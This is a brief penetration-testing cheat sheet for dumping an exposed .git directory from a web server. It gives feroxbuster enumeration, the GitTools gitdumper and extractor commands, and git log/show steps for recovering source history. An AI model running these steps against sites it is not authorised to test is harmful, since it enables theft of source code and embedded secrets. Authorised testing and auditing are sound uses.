# Github Exposed Repositories

Tool: GitTools https://github.com/internetwache/GitTools

### 1) Enumeration

    feroxbuster --url http://domain.local -w /usr/share/wordlists/dirb/common.txt -C 404,500,403

Finding:

    http://domain.local/.git/HEAD

### 2) Dump exposed repository locally

Download tools on our machine

    git clone https://github.com/internetwache/GitTools

Dump exposed git repo

    ./gitdumper.sh http://domain.local/.git/ /home/user/Desktop/repo

### 3) Extract commits and their content

    ./extractor.sh /home/user/Desktop/repo /home/user/Desktop/repodump

### 4) Go to "repo" directory and enumerate

    cd /home/user/Desktop/repo

Get all commits in repository

    git log

See details of a specific commit

    git show COMMIT_NUM

Sort interesting findings in git logs directory by size

    cd ~/.git/logs/refs/heads
    ls -lna | sort -n -r
